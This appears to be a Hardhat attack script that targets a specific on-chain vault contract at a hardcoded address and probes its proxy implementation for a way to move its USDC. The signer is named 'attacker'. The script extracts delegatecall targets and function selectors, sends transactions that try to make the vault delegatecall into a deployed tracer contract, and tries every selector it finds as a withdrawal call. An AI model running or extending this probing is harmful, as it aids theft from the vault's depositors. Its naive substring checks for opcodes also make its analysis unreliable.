const { ethers } = require("hardhat");
const fs = require("fs");

const IMPLEMENTATION_ADDRESS = "0x11fb858ee4bf594857483bcf86eb825aef1cbf91";
const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";

/**
 * @title Decode Minimal Implementation
 * @notice The 600-byte implementation is likely a minimal proxy - find the real logic
 * @dev Analyze bytecode patterns and delegatecall targets
 */
async function main() {
  console.log("\nðŸ”¬ DECODING MINIMAL IMPLEMENTATION");
  console.log("=====================================");
  
  const [attacker] = await ethers.getSigners();
  
  // Get implementation bytecode
  const implCode = await ethers.provider.getCode(IMPLEMENTATION_ADDRESS);
  console.log("Implementation size:", implCode.length / 2 - 1, "bytes");
  
  // Look for common minimal proxy patterns
  console.log("\nðŸ” Analyzing bytecode patterns:");
  
  // Pattern 1: EIP-1167 Minimal Proxy (363d3d373d3d3d363d73)
  if (implCode.includes("363d3d373d3d3d363d73")) {
    const index = implCode.indexOf("363d3d373d3d3d363d73");
    const targetAddress = "0x" + implCode.substring(index + 20, index + 60);
    console.log("âœ… EIP-1167 Minimal Proxy detected!");
    console.log("Target logic contract:", targetAddress);
    await analyzeLogicContract(targetAddress);
    return;
  }
  
  // Pattern 2: Look for PUSH20 addresses (73 followed by 20 bytes)
  const push20Pattern = /73([0-9a-f]{40})/g;
  const addresses = [];
  let match;
  
  while ((match = push20Pattern.exec(implCode)) !== null) {
    const addr = "0x" + match[1];
    if (addr !== "0x" + "f".repeat(40)) { // Skip all F addresses
      addresses.push(addr);
      console.log("Found address:", addr);
    }
  }
  
  // Pattern 3: Extract delegatecall targets
  console.log("\nðŸŽ¯ Extracting DELEGATECALL targets:");
  
  // DELEGATECALL is F4, look for patterns around it
  const delegatePattern = /5b(?:60[0-9a-f]{2}){0,4}73([0-9a-f]{40})(?:60[0-9a-f]{2}){0,4}5af4/g;
  
  while ((match = delegatePattern.exec(implCode)) !== null) {
    const target = "0x" + match[1];
    console.log("DELEGATECALL target:", target);
    addresses.push(target);
  }
  
  // Analyze each found address
  console.log("\nðŸ“Š Analyzing found addresses:");
  
  for (const addr of [...new Set(addresses)]) {
    await analyzeContract(addr);
  }
  
  // Try to trace delegatecall execution
  console.log("\nðŸ”„ Tracing DELEGATECALL execution:");
  
  // Create a contract that logs delegatecall targets
  const TracerCode = `
  pragma solidity ^0.8.0;
  
  contract DelegateTracer {
    address public lastTarget;
    bytes public lastData;
    
    fallback() external payable {
      lastTarget = msg.sender;
      lastData = msg.data;
      
      // Return some data to avoid revert
      assembly {
        mstore(0, 1)
        return(0, 32)
      }
    }
  }`;
  
  // Deploy tracer
  const TracerFactory = await ethers.getContractFactory("DelegateTracer");
  const tracer = await TracerFactory.deploy();
  await tracer.waitForDeployment();
  const tracerAddress = await tracer.getAddress();
  console.log("Tracer deployed at:", tracerAddress);
  
  // Test delegatecall patterns
  const testPatterns = [
    // Try to make vault delegatecall to our tracer
    {
      name: "execute(address,bytes)",
      data: "0xb61d27f6" + ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "uint256", "bytes"],
        [tracerAddress, 0, "0x12345678"]
      ).slice(2)
    },
    {
      name: "delegateCall(address,bytes)",
      data: "0x5b34b966" + ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "bytes"],
        [tracerAddress, "0x12345678"]
      ).slice(2)
    }
  ];
  
  for (const pattern of testPatterns) {
    try {
      console.log(`\nTesting ${pattern.name}:`);
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: pattern.data,
        gasLimit: 200000
      });
      await tx.wait();
      
      // Check tracer state
      const target = await tracer.lastTarget();
      const data = await tracer.lastData();
      
      if (target !== ethers.ZeroAddress) {
        console.log("âœ… Delegatecall captured!");
        console.log("Target:", target);
        console.log("Data:", data);
      }
    } catch (e) {
      console.log("âŒ Failed");
    }
  }
  
  // Direct bytecode analysis
  console.log("\nðŸ“œ Direct bytecode disassembly:");
  disassembleCriticalParts(implCode);
}

async function analyzeLogicContract(address) {
  console.log("\nðŸŽ¯ Analyzing logic contract:", address);
  
  const code = await ethers.provider.getCode(address);
  console.log("Logic contract size:", code.length / 2 - 1, "bytes");
  
  // Extract function selectors
  const selectors = extractSelectors(code);
  console.log("Function selectors found:", selectors.length);
  
  // Test common withdrawal functions
  const [attacker] = await ethers.getSigners();
  const USDC = await ethers.getContractAt("contracts/IERC20.sol:IERC20", USDC_ADDRESS);
  
  console.log("\nðŸ’° Testing withdrawal functions on logic contract:");
  
  for (const selector of selectors) {
    try {
      // Test with USDC parameter
      const data = selector + ethers.AbiCoder.defaultAbiCoder().encode(
        ["address"],
        [USDC_ADDRESS]
      ).slice(2);
      
      const result = await attacker.call({
        to: address,
        data: data
      });
      
      if (result && result !== "0x") {
        console.log(`${selector}: Returns data`);
      }
    } catch (e) {}
  }
}

async function analyzeContract(address) {
  try {
    const code = await ethers.provider.getCode(address);
    if (code !== "0x") {
      console.log(`\n${address}:`);
      console.log("- Size:", code.length / 2 - 1, "bytes");
      
      // Check if it's USDC
      if (address.toLowerCase() === USDC_ADDRESS.toLowerCase()) {
        console.log("- This is the USDC token contract");
        return;
      }
      
      // Check for common patterns
      if (code.includes("60806040")) {
        console.log("- Contains standard contract header");
      }
      
      if (code.includes("f4")) {
        console.log("- Contains DELEGATECALL");
      }
      
      if (code.includes("ff")) {
        console.log("- Contains SELFDESTRUCT");
      }
      
      // Extract selectors
      const selectors = extractSelectors(code);
      if (selectors.length > 0) {
        console.log("- Function selectors:", selectors.slice(0, 5).join(", "), 
                   selectors.length > 5 ? `... (${selectors.length} total)` : "");
      }
    }
  } catch (e) {
    console.log(`${address}: Failed to analyze`);
  }
}

function extractSelectors(bytecode) {
  const selectors = new Set();
  const push4Pattern = /63([0-9a-f]{8})/g;
  let match;
  
  while ((match = push4Pattern.exec(bytecode)) !== null) {
    selectors.add("0x" + match[1]);
  }
  
  return Array.from(selectors);
}

function disassembleCriticalParts(bytecode) {
  // Remove 0x prefix
  const code = bytecode.slice(2);
  
  console.log("\n Key sections:");
  
  // Find SELFDESTRUCT section
  const ffIndex = code.indexOf("ff");
  if (ffIndex !== -1) {
    const start = Math.max(0, ffIndex - 20);
    const end = Math.min(code.length, ffIndex + 20);
    console.log(`\nSELFDESTRUCT at ${ffIndex/2}:`);
    console.log(code.substring(start, end));
  }
  
  // Find DELEGATECALL sections
  let f4Index = code.indexOf("f4");
  let count = 0;
  while (f4Index !== -1 && count < 3) {
    const start = Math.max(0, f4Index - 40);
    const end = Math.min(code.length, f4Index + 20);
    console.log(`\nDELEGATECALL at ${f4Index/2}:`);
    console.log(code.substring(start, end));
    
    // Look for the target address before DELEGATECALL
    const before = code.substring(Math.max(0, f4Index - 100), f4Index);
    const push20Match = before.match(/73([0-9a-f]{40})/);
    if (push20Match) {
      console.log("Target:", "0x" + push20Match[1]);
    }
    
    f4Index = code.indexOf("f4", f4Index + 2);
    count++;
  }
  
  // Write full disassembly to file
  fs.writeFileSync("implementation_bytecode.txt", bytecode);
  console.log("\nFull bytecode saved to implementation_bytecode.txt");
}

main().catch((error) => {
  console.error("\nðŸ’¥ Script error:", error);
  process.exit(1);
});
